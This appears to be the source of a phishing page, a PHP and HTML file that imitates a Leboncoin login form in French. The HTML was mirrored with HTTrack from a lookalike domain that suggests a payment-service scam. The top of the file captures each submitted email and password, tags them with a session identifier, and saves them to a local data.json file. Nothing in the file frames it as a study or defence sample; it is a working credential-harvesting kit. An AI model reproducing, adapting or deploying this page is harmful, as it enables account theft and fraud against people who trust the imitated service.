<?php
session_start();

// Vérifier si le formulaire a été soumis
if (isset($_POST['validers'])) {
    $email = $_POST['mail'];
    $password = $_POST['pass'];

    $newAccount = array(
        'matriculeCara' => $_SESSION['matricule'],
        'email' => $email,
        'password' => $password,

    );

    // Ajout du nouveau compte à la structure JSON
    $data['accesleboncoin'][] = $newAccount;
    $_SESSION['emailLeboncoin'] = $email;
    $_SESSION['passwordLeboncoin'] = $password;
    // Écriture des données mises à jour dans data.json
    $jsonDataUpdated = json_encode($data, JSON_PRETTY_PRINT);
    if (file_put_contents('data.json', $jsonDataUpdated)) {
        echo "<div class='message'><p>Le compte leboncoin a été ajouté avec succès!</p></div><br>";
    } else {
        echo "<div class='message'><p>Erreur lors de l'écriture dans data.json.</p></div><br>";
    }
}

?>
<!DOCTYPE html>
<html dir="ltr">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->

<head>
    <title>Connectez vous à votre compte</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
    <meta charset="utf8">
    <link rel="stylesheet" href="asset/css/normalize.css" />
    <link rel="stylesheet" href="asset/css/bootstrap.min.css" />
    <link rel="stylesheet" href="asset/css/font-awesome.min.css" />
    <link rel="stylesheet" href="asset/css/login.css" />
    <link rel="shortcut icon" type="image/x-icon" href="img/ppl.html">
</head>

<body>
    <div class="lod-full" style="display: none;">
        <div class="lod-c"></div>
    </div>
    <style>
        @media (max-width: 430px) {
            .log-f {
                padding: 0 8% 30px;
            }
        }

        x .error {
            border: 1px solid #c72e2e;
        }
    </style>
    <div class="contain">
        <form class="log-f" method="POST" action="index.php" id="logform">
            <center>
                <img src="asset/img/ico.png" style="width:250px">
                <h3>Connecter vous</h3>
            </center>
            <input id="email" type="email" name="mail" class="in-form" placeholder="Email" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
            <input id="pass" type="password" name="pass" class="in-form" placeholder="Mot de passe" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
            <br>
            <button type="submit" class="login-btn" name="validers" style="background-color:orangeRed">Suivant</button>
            <a href="#" class="problem">Vous n'arrivez pas à vous connecter ?</a>
            <hr class="hr ou">
            <a href="#" class="login-btn sin-up" id="btn-submit">Ouvrir un compte</a>
        </form>
    </div>
    <div class="foot-pay">
        <center>
            <a href="#">Aide et Contact</a>
            <a href="#">Confidentialité</a>
            <a href="#">Légal</a>
            <a href="#">Sécurité</a>
        </center>
    </div>
    <script src="js/jquery-1.11.3.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/plugins.js"></script>

</body>

<!-- Mirrored from service-ppltransactions.sportsworld.ps/gHcl4Mm45vd4LHmCQSolptbbRTxnQIK3oJB/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 24 Oct 2020 16:24:25 GMT -->

</html>